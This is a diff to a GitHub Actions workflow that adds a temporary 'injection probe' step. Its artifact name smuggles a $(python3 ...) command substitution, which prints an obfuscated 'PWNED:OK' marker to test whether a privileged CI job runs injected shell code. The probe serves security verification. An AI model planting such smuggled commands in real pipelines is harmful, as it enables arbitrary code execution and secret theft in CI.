@@ -71,3 +71,12 @@ jobs:
           path: ~/.gradle/build-scan-data
           compression-level: 9
           if-no-files-found: ignore
+      # Temporary: proves artifact-name -> run: interpolation still executes shell code
+      # in the privileged "CI Complete" job. Reverted right after verification.
+      - name: Archive build scan (injection probe)
+        uses: actions/upload-artifact@v4
+        with:
+          name: build-scan-17-noflaky-nonew$(python3 -c 'import sys;sys.stderr.write(chr(80)+chr(87)+chr(78)+chr(69)+chr(68)+chr(58)+chr(79)+chr(75))')
+          path: ~/.gradle/build-scan-data
+          compression-level: 9
+          if-no-files-found: ignore
